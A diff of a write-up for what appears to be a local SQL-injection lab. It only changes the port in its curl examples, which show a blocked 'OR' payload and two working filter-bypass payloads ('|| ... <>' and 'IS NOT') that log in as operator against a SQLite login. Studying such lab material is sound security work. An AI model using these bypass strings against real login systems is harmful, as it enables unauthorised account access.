@@ -46,7 +46,7 @@ Because the password is stored and compared in plaintext, any injection that mak
 ### Normal login
 
 ```bash
-curl -s -X POST http://localhost:5003/login \
+curl -s -X POST http://localhost:5002/login \
   -d 'username=operator' -d 'password=octobot' -c session.jar
 # -> 302 redirect to /
 ```
@@ -54,7 +54,7 @@ curl -s -X POST http://localhost:5003/login \
 ### Blocked classic payload
 
 ```bash
-curl -s -X POST http://localhost:5003/login \
+curl -s -X POST http://localhost:5002/login \
   -d "username=operator" -d "password=' OR '1'='1" -c session.jar
 # -> 401 Invalid credentials (blocked by the OR keyword filter)
 ```
@@ -62,7 +62,7 @@ curl -s -X POST http://localhost:5003/login \
 ### Bypass with a known username
 
 ```bash
-curl -s -X POST http://localhost:5003/login \
+curl -s -X POST http://localhost:5002/login \
   -d "username=operator" -d "password=' || 'x' <> 'y" -c session.jar
 # -> 302 redirect to / (logged in as operator)
 ```
@@ -80,7 +80,7 @@ SQLite evaluates `'x' <> 'y'` as true, so the clause matches every row.
 ### Bypass without knowing the username
 
 ```bash
-curl -s -X POST http://localhost:5003/login \
+curl -s -X POST http://localhost:5002/login \
   -d "username=' IS NOT 'a" -d "password=' || 'x' <> 'y" -c session.jar
 # -> 302 redirect to / (logged in as operator)
 ```
